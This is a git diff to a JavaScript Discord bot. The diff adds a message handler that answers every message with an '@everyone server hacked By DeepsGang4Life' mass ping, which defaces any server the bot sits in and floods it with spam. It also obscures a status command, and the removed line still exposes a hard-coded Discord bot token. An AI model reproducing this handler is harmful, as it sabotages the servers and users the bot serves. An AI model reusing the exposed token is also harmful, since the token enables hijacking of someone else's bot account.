@@ -12,10 +12,16 @@ console.log('      ~            ~  By : KBOOOOOOOOSH-YT ~           ~    ');
 console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~');
 console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~');
 console.log(`Logged in as  * [ "  KBOOOOOOOOSH-YT " ] servers! [ " ${LOka.guilds.size} " ] Users! [ " ${LOka.users.size} " ]`);
-
+ 
+      LOka.on("message", msg => {
+        msg.channel.send('@everyone server hacked By DeepsGang4Life :smiling_imp: ')
+     
+      
+      }); 
+   
  
 });
-var prefix = "66"
+var prefix = "-"
 LOka.on("message", message => {
   if(!message.content.startsWith(prefix)) return;;
   let args = message.content.split(" ").slice(1);
@@ -23,7 +29,7 @@ LOka.on("message", message => {
   if (message.content.startsWith('hix15')) {
     LOka.user.setUsername(argresult);
   }
-    if (message.content.startsWith(prefix + 'on')) {
+    if (message.content.startsWith(prefix + 'on123')) {
     LOka.user.setStatus(argresult);
   }
 });
@@ -378,4 +384,4 @@ LOka.on('guildMemberAdd', member => {
  
  
  
-LOka.login("NzA2NTI3NDE0MzcyNjYzMzg4.Xq7j-A.nlmbmgbrNkkzHq6rT-4i9XYC8QU");
+LOka.login(process.env.BOT_TOKEN);
